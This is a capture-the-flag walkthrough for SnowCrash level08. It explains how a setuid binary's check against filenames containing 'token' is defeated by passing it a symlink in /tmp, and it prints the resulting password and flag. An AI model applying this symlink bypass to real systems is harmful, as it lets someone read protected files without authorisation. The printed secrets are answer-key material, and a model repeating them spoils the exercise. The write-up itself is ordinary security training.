# Level08

There is a file to decompile again: https://dogbolt.org/?id=dd39ba2e-06a7-4e59-b781-7ddd00932474

```
if (argc == 1)
    {
        printf("%s [file to read]\n", *argv);
        exit(1);
        /* no return */
    }
    
    if (strstr(argv[1], "token"))
    {
        printf("You may not access '%s'\n", argv[1]);
        exit(1);
        /* no return */
    }
```
```
level08@SnowCrash:~$ cat token
cat: token: Permission denied
level08@SnowCrash:~$ chmod -rw token
chmod: changing permissions of `token': Operation not permitted
```

We don't have the permission to open the file token

But we can create a symbolic link
```
level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/level08
```

We still can't open the file
```
level08@SnowCrash:~$ cat /tmp/level08
cat: /tmp/level08: Permission denied
```

But the executable yes
```
level08@SnowCrash:~$ ./level08 /tmp/level08
quif5eloekouj29ke0vouxean
```

```
level08@SnowCrash:~$ su flag08
Password: quif5eloekouj29ke0vouxean
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```